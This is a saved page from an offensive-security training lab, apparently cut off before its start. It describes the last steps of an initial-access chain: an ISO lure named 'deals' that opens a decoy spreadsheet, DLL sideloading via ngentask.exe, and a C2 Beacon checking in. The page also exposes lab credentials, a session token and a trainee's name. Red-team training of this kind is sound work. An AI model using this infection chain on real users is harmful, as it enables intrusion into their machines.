+<li class="task-list-item" id="taskIndex28"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex28"><span></span></label> Switch over to <a href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" class="selectMachineLink icon-link special-action-link" data-data="305637">Workstation</a> and login with <span class="typeText" title="Type Text" tabindex="0" role="button">Passw0rd!</span>.</p></li>
+<li class="task-list-item" id="taskIndex29"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex29"><span></span></label> Open Microsoft Edge and browse to <span class="typeText" title="Type Text" tabindex="0" role="button">http://www.bleepincomputer.com/deals</span></p></li>
+<li class="task-list-item" id="taskIndex30"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex30"><span></span></label> Click <em>Open file</em> when deals.iso downloads.</p></li>
+<li class="task-list-item" id="taskIndex31"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex31"><span></span></label> Double-click on <em>deals.xlsx</em> and the decoy will open.</p></li>
+<li class="task-list-item" id="taskIndex32"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex32"><span></span></label> Switch back to <a href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" class="selectMachineLink icon-link special-action-link" data-data="351850">Attacker Desktop</a> and a Beacon should be checking in from msedge.exe, as the user pchilds.</p></li>
+</ol>
+<p><br></p>
+<blockquote class="knowledge">
+  <p>In this lab you have created an initial access infection chain, leveraging DLL sideloading with ngentask.exe.</p>
+</blockquote><div class="moreKnowledge"><a href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" class="moreKnowledgeLink" style="display: none;">more...</a></div></div></div>
+                </div>
+                <div class="instructions-footer primary-color-low-opacity-border">
+                    <div id="instructionsNavigation" class="instructions-navigation" role="navigation" aria-label="Previous/Next">
+                        <button id="previous" class="previous-button icon noselect" title="Previous: NGenTask" tabindex="0">Previous</button>
+                        <button id="next" class="next-button icon noselect" title="Next: Trigger">Next</button>
+                    </div>
+                    <div class="progress-and-timer-wrapper">
+                        <div id="taskProgressBar" class="lab-progress-bar primary-color-low-opacity-background" tabindex="0" title="19/33 (57%) Tasks Complete" style="">
+                            <div id="taskProgress" class="lab-progress-fill primary-color-background" style="width: 57%;"></div>
+                        </div>
+                        <div id="timerWrapper" class="timer-wrapper expiring">
+                            <span id="timer" class="timer primary-color warning" tabindex="0">4 Minutes Remaining</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="resourcesTab" class="tab  resources">
+                <div class="tab-content">
+                    <div>
+                        <div id="cloudCredentials"></div>
+                        <div id="refreshCredentials" style="display:none;">
+                            <input type="button" value="Refresh Credentials" aria-label="Refresh Credentials" id="refreshCredsBtn" class="primary">
+                            <span id="credentialsRefreshing" style="display:none;" class="loadingAnimation-medium"></span>
+                        </div>
+                        <div id="cloudResources"></div>
+                        <div id="resourcesExtensions"><div class="machine hoverColor selectedColor activeColor accent-background selected" id="machine351850"><img alt="Thumbnail screenshot of virtual machineLab67502652-Attacker Desktop" class="thumbnail" src="./saved_resource">
+            <div class="machineNameCenter" role="button" tabindex="0" aria-expanded="true" aria-label="Select Attacker Desktop machine">
+                <div class="machineName">Attacker Desktop</div>
+            </div>
+            <div class="inputRelease">
+                To release mouse, press <strong>Ctrl+Alt+Left Arrow</strong>
+            </div>
+            <div class="machineInfo" style="">
+                <table class="credentials fields">
+                    <caption class="sr-only">Machine credentials</caption>
+                    <tbody><tr>
+                        <th scope="row" class="fieldName">Username</th>
+                        <td><span class="typeText username" title="Type Text" role="button" tabindex="0" aria-label="Type Username" aria-description="Attacker Desktop Type Text Username">Attacker</span></td>
+                    </tr>
+                    <tr>
+                        <th scope="row" class="fieldName">Password</th>
+                        <td><span class="typeText password" title="Type Text" role="button" tabindex="0" aria-label="Type Password" aria-description="Attacker Desktop Type Text Password">Passw0rd!</span></td>
+                    </tr>
+                </tbody></table>
+                <div class="floppyDrive" style="display: none;">
+                </div>
+                <div class="dvdDrive">
+                    <div class="dvdDriveInner" style="display:none;">
+                        <label for="dvdDriveSelect" class="selectHeading">DVD Drive</label>
+                        <select id="dvdDriveSelect" aria-label="Attacker Desktop DVD Drive">
+                            <option value="-2">No Media</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="networkAdapters"></div>
+                <div class="action-buttons">
+                    <input type="button" class="ctrlAltDel ctrl-alt-del-button" value="Ctrl+Alt+Delete" aria-label="Send Ctrl Alt Delete">
+                        <div>
+                            <a class="openInNewWindow open-in-new-window-link icon-link" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" aria-label="Open in New Window">Open in New Window</a>
+                        </div>
+                    <div class="open-multiple-display-window-wrapper" style="display:none;">
+                        <a class="open-multiple-display-window open-in-new-window-link icon-link" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" aria-label="Open Multiple Display Window">Open Multiple Display Window</a>
+                    </div>
+                </div>
+            </div>
+        </div><div class="machine hoverColor selectedColor activeColor accent-background" id="machine305660"><img alt="Thumbnail screenshot of virtual machineLab67502652-Domain Controller" class="thumbnail" src="./saved_resource(1)">
+            <div class="machineNameCenter" role="button" tabindex="0" aria-expanded="false" aria-label="Select Domain Controller machine">
+                <div class="machineName">Domain Controller</div>
+            </div>
+            <div class="inputRelease">
+                To release mouse, press <strong>Ctrl+Alt+Left Arrow</strong>
+            </div>
+            <div class="machineInfo" style="display: none;">
+                <table class="credentials fields">
+                    <caption class="sr-only">Machine credentials</caption>
+                    <tbody><tr>
+                        <th scope="row" class="fieldName">Username</th>
+                        <td><span class="typeText username" title="Type Text" role="button" tabindex="0" aria-label="Type Username" aria-description="Domain Controller Type Text Username">CONTOSO\Administrator</span></td>
+                    </tr>
+                    <tr>
+                        <th scope="row" class="fieldName">Password</th>
+                        <td><span class="typeText password" title="Type Text" role="button" tabindex="0" aria-label="Type Password" aria-description="Domain Controller Type Text Password">Passw0rd!</span></td>
+                    </tr>
+                </tbody></table>
+                <div class="floppyDrive" style="display: none;">
+                </div>
+                <div class="dvdDrive">
+                    <div class="dvdDriveInner" style="display:none;">
+                        <label for="dvdDriveSelect" class="selectHeading">DVD Drive</label>
+                        <select id="dvdDriveSelect" aria-label="Domain Controller DVD Drive">
+                            <option value="-2">No Media</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="networkAdapters"></div>
+                <div class="action-buttons">
+                    <input type="button" class="ctrlAltDel ctrl-alt-del-button" value="Ctrl+Alt+Delete" aria-label="Send Ctrl Alt Delete">
+                        <div>
+                            <a class="openInNewWindow open-in-new-window-link icon-link" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" aria-label="Open in New Window">Open in New Window</a>
+                        </div>
+                    <div class="open-multiple-display-window-wrapper" style="display:none;">
+                        <a class="open-multiple-display-window open-in-new-window-link icon-link" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" aria-label="Open Multiple Display Window">Open Multiple Display Window</a>
+                    </div>
+                </div>
+            </div>
+        </div><div class="machine hoverColor selectedColor activeColor accent-background" id="machine305637"><img alt="Thumbnail screenshot of virtual machineLab67502652-Workstation" class="thumbnail" src="./saved_resource(2)">
+            <div class="machineNameCenter" role="button" tabindex="0" aria-expanded="false" aria-label="Select Workstation machine">
+                <div class="machineName">Workstation</div>
+            </div>
+            <div class="inputRelease">
+                To release mouse, press <strong>Ctrl+Alt+Left Arrow</strong>
+            </div>
+            <div class="machineInfo" style="display: none;">
+                <table class="credentials fields">
+                    <caption class="sr-only">Machine credentials</caption>
+                    <tbody><tr>
+                        <th scope="row" class="fieldName">Username</th>
+                        <td><span class="typeText username" title="Type Text" role="button" tabindex="0" aria-label="Type Username" aria-description="Workstation Type Text Username">CONTOSO\pchilds</span></td>
+                    </tr>
+                    <tr>
+                        <th scope="row" class="fieldName">Password</th>
+                        <td><span class="typeText password" title="Type Text" role="button" tabindex="0" aria-label="Type Password" aria-description="Workstation Type Text Password">Passw0rd!</span></td>
+                    </tr>
+                </tbody></table>
+                <div class="floppyDrive" style="display: none;">
+                </div>
+                <div class="dvdDrive">
+                    <div class="dvdDriveInner" style="display:none;">
+                        <label for="dvdDriveSelect" class="selectHeading">DVD Drive</label>
+                        <select id="dvdDriveSelect" aria-label="Workstation DVD Drive">
+                            <option value="-2">No Media</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="networkAdapters"></div>
+                <div class="action-buttons">
+                    <input type="button" class="ctrlAltDel ctrl-alt-del-button" value="Ctrl+Alt+Delete" aria-label="Send Ctrl Alt Delete">
+                        <div>
+                            <a class="openInNewWindow open-in-new-window-link icon-link" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" aria-label="Open in New Window">Open in New Window</a>
+                        </div>
+                    <div class="open-multiple-display-window-wrapper" style="display:none;">
+                        <a class="open-multiple-display-window open-in-new-window-link icon-link" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" aria-label="Open Multiple Display Window">Open Multiple Display Window</a>
+                    </div>
+                </div>
+            </div>
+        </div></div>
+                        <div id="containers"></div>
+                        <div id="externalResources"></div>
+                    </div>
+                </div>
+            </div>
+            <div id="notifications-menu" class="modal-menu page-background-color" role="dialog" aria-modal="true" aria-labelledby="notifications-menu-title">
+                <div class="modal-menu-title-bar primary-color-background">
+                    <h2 id="notifications-menu-title" class="modal-menu-title">Notifications</h2>
+                    <span><a class="close-modal-menu-button" tabindex="0" role="button" aria-label="Close" title="Close"></a></span>
+                </div>
+                <div class="modal-menu-content"></div>
+            </div>
+            <div id="settings-menu" class="modal-menu page-background-color" role="dialog" aria-modal="true" aria-labelledby="settings-menu-title" style="display: none; left: 16px; right: 16px; width: initial;">
+                <div class="modal-menu-title-bar primary-color-background">
+                    <h2 id="settings-menu-title" class="modal-menu-title">Settings</h2>
+                    <span><a class="close-modal-menu-button" tabindex="0" role="button" aria-label="Close" title="Close"></a></span>
+                </div>
+                <div class="modal-menu-content">
+
+
+                    <h3 id="text-size-heading" class="settings-heading primary-color">Text Size</h3>
+
+                    <div class="text-size-options" role="radiogroup" aria-labelledby="text-size-heading">
+                        <div class="text-size-choice"><label><input type="radio" name="text-size" checked="" value="100"><span class="checkbox"></span>Standard</label></div>
+                        <div id="text-size-choice-large" class="text-size-choice"><label><input type="radio" name="text-size" value="150"><span class="checkbox"></span>Large Text</label></div>
+                        <div id="text-size-choice-extra-large" class="text-size-choice"><label><input type="radio" name="text-size" value="200"><span class="checkbox"></span>Extra Large Text</label></div>
+                    </div>
+
+                    <hr>
+
+                        <h3 class="settings-heading primary-color"><label for="theme">Color Mode</label></h3>
+                        <div>
+                            <select id="theme">
+                                    <option value="5" data-name="green" data-style-sheet-url="/theme/styles-v2?themeId=1051&amp;mode=light" selected="selected">Light</option>
+                                    <option value="20" data-name="dark" data-style-sheet-url="/theme/styles-v2?themeId=1051&amp;mode=dark">Dark</option>
+                                    <option value="4" data-name="gray" data-style-sheet-url="/theme/styles-v2?themeId=1051&amp;mode=highcontrast">High Contrast</option>
+                            </select>
+                        </div>
+                        <hr>
+
+                        <h3 class="settings-heading primary-color">Actions</h3>
+                        <div id="mainMenuExtensions"><div class="link-list-item"><a id="splitWindows" href="https://labclient.labondemand.com/Instructions/35e0bfef-456c-42f4-ba18-2eb8e892633a#" class="split-windows-link icon-link">Split Windows</a></div></div>
+
+                </div>
+            </div>
+        </div>
+        <div id="notificationContainer" role="region" aria-label="Notifications" style="margin-bottom: 114.568px;"></div>
+    </div>
+
+    <div id="fullScreenMessage" style="display: none;" role="dialog" aria-modal="true" aria-labelledby="fullScreenMessageTitle" aria-describedby="fullScreenMessageText">
+        <div id="fullScreenMessageMask"></div>
+        <div id="fullScreenMessageIcon"></div>
+        <div id="fullScreenMessageCenter" class="baseColor">
+            <div id="fullScreenMessageTextWrapper">
+                <span id="fullScreenMessageLoadingIcon" class="loadingAnimation-large"></span>
+                <div id="fullScreenMessageTitle" role="heading" aria-level="1"></div>
+                <div id="fullScreenMessageText" role="status"></div>
+                <div id="fullScreenMessageButtonWrapper">
+                    <span id="fullScreenMessageButtons"></span>
+                    <input type="button" id="closeWindow" value="Close Window">
+                </div>
+                <div id="fullScreenProgressWrapper" style="display: none;">
+                    <div id="fullScreenProgressText"></div>
+                    <div id="fullScreenProgressBar" class="primary-color-low-opacity-background" role="progressbar" aria-labelledby="fullScreenProgressText" aria-valuemin="0" aria-valuemax="100">
+                        <div id="fullScreenProgressFill" class="primary-color-background"></div>
+                    </div>
+                    <div id="fullScreenProgressAnnouncement" class="sr-only" role="status" aria-live="polite" aria-atomic="true"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="examResultDetails" style="display: none;" role="dialog" aria-modal="true" aria-labelledby="ExamResultDetailsTitle">
+        <div id="examResultDetailsHeader"></div>
+        <div id="examResultDetailsCenter" class="baseColor">
+            <div id="examResultDetailsWrapper">
+                <div id="examResultDetailsTitle"></div>
+                <div id="examResultDetailsText"></div>
+                <div id="examResultDetailsButtonWrapper">
+                    <span id="examResultDetailsButtons"></span>
+                    <input type="button" id="closeWindow" value="Close Window">
+                </div>
+                <div id="exResultDetailsProgressWrapper" style="display: none;">
+                    <div id="examResultDetailsProgressText"></div>
+                    <div id="examResultDetailsProgressBar">
+                        <div id="examResultDetailsProgressFill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <textarea id="copyInput" style="position: absolute; left: -10000px; top: -10000px; display: none;"></textarea>
+
+    <script>
+    var model = {
+        id: 67502652,
+        key: "35e0bfef-456c-42f4-ba18-2eb8e892633a",
+        labProfileId: "216752",
+        instructionsSetId: "347782",
+        layoutVersion: 2,
+        isPreview: false,
+        isThemePreview: false,
+previewKey: null,        mentorSessionId: null,
+        mentorAuthToken: null,
+        mentorAuthTokenExpiresAt: null,
+        antiforgeryToken: "CfDJ8HQSnP9K8HdOnDiHZ_L6eWDz7uTjwPVOe-9WQGy-OJUVTu4w_LbSNi3mZiwzN629K9nvvJqzDT1Z4qz_rRvYckPtGY3m1KprQjyESarcFJ3NoItJYu-3Jj-9j2ji7Gr-VlMU4Ft7b8RHZzJqFq3bqFg",
+        helpTabLabel: "Help",
+        monitor: false,
+        takeControl: false,
+        allowUserTransferSaves: false,
+        userId: "9595660",
+        userFullName: "TEBBAA ADNANE",
+        publishKey: "pub-c-4b0a6a73-e675-4561-b40f-cee58350bb9f",
+        subscribeKey: "sub-c-9c6a8086-0758-11eb-8c73-de77696b0464"
+    };
+
+    </script>
+
+    
+    <script>
+      (function(h,o,u,n,d) {
+        h=h[d]=h[d]||{q:[],onReady:function(c){h.q.push(c)}}
+        d=o.createElement(u);d.async=1;d.src=n
+        n=o.getElementsByTagName(u)[0];n.parentNode.insertBefore(d,n)
+        })(window,document,'script','https://www.datadoghq-browser-agent.com/us3/v6/datadog-logs.js','DD_LOGS')
+      window.DD_LOGS.onReady(function() {
+          window.DD_LOGS.init({
+            clientToken: 'pub95df9c2772f25cae094492ee095d1bca',
+            site: 'us3.datadoghq.com',
+            env: 'prod',
+            service: 'lab-client-frontend',
+            forwardErrorsToLogs: true,
+            telemetrySampleRate: 100,
+            trackSessionAcrossSubdomains: true,
+            forwardConsoleLogs: ['error', 'warn'],
+          })
+        })
+    </script>
+
+    
+<script>
+    let iFrameDetectorModel = {
+        requireIFrame: false
+    };
+
+    function isInIFrame() {
+        return (window === window.parent) ? false : true;
+    }
+
+    $(function () {
+        if (iFrameDetectorModel.requireIFrame && !isInIFrame()) {
+            window.location.href = "/AccessDenied";
+        };
+    });
+
+</script>
+
+
+
+</body></html>
